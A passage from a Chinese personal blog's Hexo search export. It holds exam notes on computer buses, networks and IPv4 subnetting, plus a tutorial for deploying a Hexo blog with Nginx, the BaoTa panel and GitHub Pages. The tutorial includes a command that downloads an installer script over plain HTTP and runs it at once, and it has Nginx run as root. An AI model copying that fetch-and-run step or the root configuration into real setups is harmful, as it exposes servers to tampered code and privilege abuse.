start="4"><li><p>总线和接口</p><ul><li>按照传送信息来分类</li></ul><ol><li>数据总线<ul><li>用于传送数据信息</li><li>数据信息在数据总线上双向传送</li><li>数据总线的根数决定了通过该总线一次可以传送的信息量</li></ul></li><li>地址总线<ul><li>用来传送地址信息，地址信息在地址总线上单向传输</li><li>地址总线的根数决定了总线可以直接寻址的内存地址空间大小</li><li>n根地址总线可以寻址的地址空间是2<sup>n</sup></li></ul></li><li>控制总线<ul><li>用于在主控设备和被控设备之间传达控制信号</li></ul></li></ol><ul><li>按照所处位置分类</li></ul><ol><li>片内总线<ul><li>cpu内部多个功能部件相连的数据传输通路</li><li>cpu内部运算器，控制器以及寄存器之间通过片内总线串数的数据</li></ul></li><li>系统总线<ul><li>又称内总线，是cpu内存和各种接口电路之间的信息通路</li></ul></li><li>通信总线<ul><li>又称外总线，是计算机与计算机之前或计算机通信设备之间的信息传输通路</li></ul></li></ol></li><li><p>外部设备</p><ol><li>输入设备<ul><li>键盘，鼠标</li></ul></li><li>输出设备<ul><li>显示器，打印机，绘图仪</li></ul></li><li>外部存储器<ul><li>磁带，软盘，硬盘，光盘</li></ul></li></ol></li><li><p>冯诺依曼体系</p><ul><li>太多了，略过</li></ul></li><li><p>计算机常用的性能指标</p><ul><li>主频</li><li>字长</li><li>运算速度</li><li>存储容量</li><li>内存寻址空间</li><li>存储周期</li><li>总线的带宽</li></ul></li></ol><h1 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h1><ol><li><p>计算机网络的类别</p><ul><li>按不同的范围分<ul><li>广域网WAN</li><li>城域网MAN</li><li>局域网LAN</li><li>个人区域网PAN</li></ul></li><li>按不同使用者划分<ul><li>公用网</li><li>专用网</li></ul></li><li>用来把用户接入因特网的网络(ISP居民接入网)</li></ul></li><li><p>计算机网络的拓扑结构</p></li></ol><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164215.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164246.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ol start="3"><li><p>计算机网络体系结构</p><ol><li><p>osi七层模型体系</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164314.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>tcp/ip体系结构</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164347.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ol></li></ol><ol start="4"><li><p>ipv4</p><ul><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164411.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul></li></ol><ul><li><p>A类地址只有126的范围是因为</p><ul><li>全零表示本网络上的所有主机</li><li>127段用于环回地址</li></ul></li><li><p>侧重点：</p><ul><li>根据ip地址判断是哪一类的范围</li><li>知道网络号去求主机数怎么求</li></ul></li><li><p>所预留的特殊ip地址(也就是不在互联网上路由)</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164434.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><ol start="5"><li><p>子网划分</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164502.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ol><ul><li><p>案例解析1</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164523.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><pre><code>+ B类地址主机号和网络号分别为16/16，二进制中网络号用全1来表示，主机号用全0表示，这里主机号为16个1，网络号为16个0+ 将27个地址划分为子网，也就是2&lt;sup&gt;n&lt;/sup&gt;&gt;=  27。 2的四次方为16，5次方为32。所以这里的n为5，需要从主机位中取5位出来，网络号为16+5=21位。+ 在未划分前用二进制来表达，有16个1是网络号，16个1是主机号。在从主机号中取了5位出来划分子网，网络号位为21个1。剩余的主机号位32-21=11个0+ 换成十进制后还是分成4段，每八位一段。八个1转成十进制为255这里不需要算，记一下就行了，需要算的是从主机号取出五个用来划分子网的网络号，也就是5个1转成十进制为多少</code></pre><ul><li><p>案例解析2</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164612.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><pre><code>+ 这里不知道划分了多少个子网，但是算一下就可以求出了。2&lt;sup&gt;n&lt;/sup&gt; &gt;= 700 n ==&gt; 10。2的九次方为512，十次方为1024。所以这里n取10。+ 32-10=22，总共有22个1，这里需要计算的是第三段6个1转成十进制为多少</code></pre><ul><li>案例解析3</li></ul><pre><code>| ![](https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164810.png) || ------------------------------------------------------------ ||                                                              |+ 每个子网最少50个主机位，2&lt;sup&gt;n&lt;/sup&gt;&gt;= 50 。2的五次方32，六次方64，n取6。c类地址网络位为8，该c类的网络位至少要保留6为的网络为，只能拿出8-6=2位网络号用于子网划分，也就是2&lt;sup&gt;2&lt;/sup&gt;为4。故结果为C</code></pre><ol start="6"><li><p>ipv6</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164855.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ol><ol start="7"><li><p>dns</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164920.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table><ul><li>DNS主要作用为将域名解析为IP地址</li><li>域名又分为不同的级别</li></ul><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164947.png" srcset="/img/loading.gif" alt="img"></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ol><ul><li><p>dns要进行ip地址解析有哪些方法？</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715165013.png" srcset="/img/loading.gif" alt="img"></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><ol start="8"><li><p>internet服务</p><ul><li>常见的interner服务</li></ul><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715165032.png" srcset="/img/loading.gif" alt="img"></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ol><ol start="9"><li><p>校验码</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715165056.png" srcset="/img/loading.gif" alt="img"></th></tr></thead><tbody><tr><td></td></tr></tbody></table><ul><li>校验码这块的知识点比较多，就不记了。用的时候再百度把</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>信工考证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>github+hexo部署个人博客踩坑记</title>
    <link href="/2020/07/15/github+hexo%E9%83%A8%E7%BD%B2%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91%E8%AE%B0/"/>
    <url>/2020/07/15/github+hexo%E9%83%A8%E7%BD%B2%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="1-git"><a href="#1-git" class="headerlink" title="1.  git"></a>1.  git</h2><ol><li><p>安装</p><ul><li><p><code>yum update &amp;&amp; yum install git -y</code></p></li><li><p>安装完成后进行验证</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200714154845.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>如果这里使用的是阿里云的服务器的话是自带有git的，完全不用安装。</p></li></ul></li><li><p>配置</p><pre><code class="hljs shell">git config --global user.name "name"# 这里的name填的是githhub的用户名git config --global user.email "emali" # emalie则是github的邮件git config user.name# 输出绑定的用户git config user.email# 输出绑定的邮箱<span class="hljs-meta">#</span><span class="bash"> 生成免密key</span>ssh-keygen -t rsa -C "emali"<span class="hljs-meta">#</span><span class="bash"> emali 指的是上面的github邮件，这一步主要是生成ssh密钥，后续将博客同步到github时用的</span></code></pre><ul><li><p>验证</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200714195255.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>最后面的生成ssh密钥已经生成过了，就不再次生成了。</p></li></ul></li></ol><h2 id="2-安装node-js"><a href="#2-安装node-js" class="headerlink" title="2. 安装node.js"></a>2. 安装node.js</h2><pre><code class="hljs shell">yum update gcc -y# 安装gcc后续用来编译安装node.jsyum install gcc+ gcc-c++ -ywget https://npm.taobao.org/mirrors/node/v10.13.0/node-v10.13.0.tar.gz# 下载node.js的安装文件tar xvf node-v10.13.0.tar.gzcd node-v10.13.0/./configure# 生成文件make# 编译这一步超级久，看服务器配置吧，反正我编译了一个钟make install# 安装</code></pre><ul><li>上面的操作都已经装过了,且不方便再重复一次,这里不贴图了。</li></ul><h2 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3. 安装hexo"></a>3. 安装hexo</h2><pre><code class="hljs shell">cd /root &amp;&amp; mkdir hexo# 切换到root目录下生成hexo文件npm config set registry https://registry.npm.taobao.org# 将npm源更换为淘宝的,如果不更换,默认源下载慢到怀疑人生.cd hexonpm install -g hexo-cli #安装hexohexo init myblog # hexo 生成myblog文件夹在其中进行初始化npm installhexo g# 生成静态文件</code></pre><ul><li>访问<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 就可以看到生成的博客了。</li><li>设置主题</li><li>hexo 官网上提供了三百多款主题，想要哪个可以自己选择：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a> (没有科学上网的话访问较慢)</li></ul><pre><code class="hljs shell">git clone 主题链接tar -xvf 主题压缩包<span class="hljs-meta">#</span><span class="bash"> 解压之后会有一个主题名</span>vim /root/hexo/myblog/_config.yml在theme：后换上解压出来的主题名就算是应用主题了。hexo clean# 清除静态文件hexo g# 生成新主题的静态文件</code></pre><ul><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200714201954.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><h2 id="4-安装宝塔-Nginx"><a href="#4-安装宝塔-Nginx" class="headerlink" title="4. 安装宝塔+Nginx"></a>4. 安装宝塔+Nginx</h2><ul><li>安装宝塔</li></ul><pre><code class="hljs bash">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</code></pre><ul><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715093804.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>安装配置Nginx</p></li><li><p>在软件商店搜索nginx，那个免费的就是了。因为安装过了，显示的是卸载。</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200714205444.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>下载之后点击右侧的设置，修改配置。</p></li><li><p>第一行改成 <code>user root www</code> 这里的用户不是root的话可能没有权限</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715082056.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>第六十五行改成也就是nginx网站根目录<code>root  /root/hexo/myblog/public;</code></p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715113613.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>再返回nginx管理，将nginx进行重启。</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715082627.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>到这一步就已经配置好网站了，可以使用ip或域名的形式访问前面部署好的hexo了。</p></li></ul><h2 id="5-部署到github"><a href="#5-部署到github" class="headerlink" title="5. 部署到github"></a>5. 部署到github</h2><ul><li><p>新建仓库，访问github.com 在首页点击创建仓库。<strong>（！！！仓库名前缀一定要和用户名一致，不然会连接不上）</strong></p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715083252.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>接下来就是修改hexo的配置文件，配置好github链接</p></li><li><p><code>vim /root/hexo/myblog/_config.yml</code></p></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># 将光标下滑至文件的末尾</span>deploy:  <span class="hljs-built_in">type</span>: git  repository:    github: git@github.com:xiaoming/xiaoming.github.io.git<span class="hljs-comment"># 这里的xiaoming改成自己的仓库名</span>  branch: master</code></pre><ul><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715084018.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>安装同步到github的插件<code>npm install hexo-deployer-git --save</code></p></li><li><p>查看前面生成的ssh密钥<code>cat /root/.ssh/id_rsa.pub</code>将其复制</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715084946.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>返回github点击右上角的头像，然后settting，再ssh key and gpg keys 添加新的ssh密钥</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715085421.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>返回服务器，在终端输入 <code>ssh -T git@github.com</code> 验证连接。提示这个显示连接成功。</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715114702.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><h2 id="6-发布文章"><a href="#6-发布文章" class="headerlink" title="6. 发布文章"></a>6. 发布文章</h2><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/hexo/myblog<span class="hljs-comment"># 切换到hexo环境下</span>hexo new hello-world<span class="hljs-comment"># 生成名为hello-world的文章</span>hexo clean<span class="hljs-comment"># 清除静态文件</span>hexo g<span class="hljs-comment"># 生成静态文件</span>hexo d<span class="hljs-comment"># 同步到github</span></code></pre><ul><li>几分钟后访问xiaoming.github.io就可以看到自己的发布的文章了。(这里的xiaoming为自己的用户名)</li></ul><h2 id="7-踩坑总结"><a href="#7-踩坑总结" class="headerlink" title="7. 踩坑总结"></a>7. 踩坑总结</h2><ul><li>默认的是next的主题，很简洁，如果要个性化的话，可以去hexo访问的主题商店，很多主题都会有文档的，有的写的很详细，有的一笔带过。这里不推荐第一次接触就去弄那种很复杂的主题，因为会怀疑人生了。(我就是折腾了大几天，自闭了都)</li><li>还有发布文章要内嵌图片的话，需要用markdown格式的链接。有个大坑需要注意，白嫖gitee的仓库做图床的话，访问着没有登录gitee账号是无法加载图片的。本博客用的是阿里云oss+picgo做的图床。(阿里云oss如何部署图床自行百度，这里不写出来了。)</li><li>hexo常用命令缩写</li></ul><pre><code class="hljs bash">hexo g <span class="hljs-comment"># 完整命令为hexo generate,用于生成静态文件</span>hexo s <span class="hljs-comment"># 完整命令为hexo server,用于启动服务器，主要用来本地预览</span>hexo d <span class="hljs-comment"># 完整命令为hexo deploy,用于将本地文件发布到github上</span>hexo n <span class="hljs-comment"># 完整命令为hexo new,用于新建一篇文章</span>------ 分割线 -------hexo new “postName” <span class="hljs-comment"># 新建文章</span>hexo new page “pageName” <span class="hljs-comment"># 新建页面</span>hexo generate <span class="hljs-comment"># 生成静态页面至public目录</span>hexo server <span class="hljs-comment"># 开启预览访问端口（默认端口4000，“ctrl + c”关闭server）</span>hexo deploy <span class="hljs-comment"># 部署到GitHub</span>hexo <span class="hljs-built_in">help</span> <span class="hljs-comment"># 查看帮助</span>hexo version <span class="hljs-comment"># 查看Hexo的版本</span>hexo s -g <span class="hljs-comment"># 生成并本地预览</span>hexo d -g <span class="hljs-comment"># 生成并上传</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello-world</title>
    <link href="/2020/07/14/hello-world/"/>
    <url>/2020/07/14/hello-world/</url>
    
    <content type="html"><![CDATA[<p>hello world<br>hello world<br>hello world</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
